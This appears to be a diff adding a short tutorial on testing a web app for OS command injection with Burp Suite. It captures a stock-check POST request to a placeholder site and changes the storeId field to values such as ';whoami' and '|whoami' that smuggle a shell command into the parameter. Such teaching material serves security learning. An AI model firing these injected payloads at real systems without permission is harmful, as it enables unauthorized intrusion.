@@ -1,0 +1,43 @@
+To test the normal OS command injection attack, first visit the target URL. I mean get the target URL.
+Then, fire up Burp Suite and run the proxy browser (in this case, we use pre-configured Burp browser).
+Next, go to Burp Suite and follow Proxy > Intercept tab and turn on the intercept function.
+Go to the Burp browser and hit enter to send the request and capture it in Burp Suite.
+
+Next, see the request captured. Do you see any parameters sent?
+It yes, then try to play around with the parameters to see if you can hack it.
+
+Like let's say that we have this request in Burp.
+
+POST /product/stock HTTP/2
+Host: mywebsite.net
+Cookie: session=kRaQpyn7qTtVmADGJ2k4a7bKLNG26e9d
+Content-Length: 21
+Sec-Ch-Ua: "Chromium";v="127", "Not)A;Brand";v="99"
+Content-Type: application/x-www-form-urlencoded
+Accept-Language: en-US
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
+Sec-Ch-Ua-Platform: "Windows"
+Accept: */*
+Origin: https://mywebsite.net
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://mywebsite.net/product?productId=1
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+
+productId=1&storeId=1
+
+After that, send this request to the repeater because we want to send multiple requests and try each result.
+
+Then, change the request to this below:
+
+productId=1&storeId=1;whoami
+
+or 
+
+productId=1&storeId=1|whoami
+
+Then, send it.
+
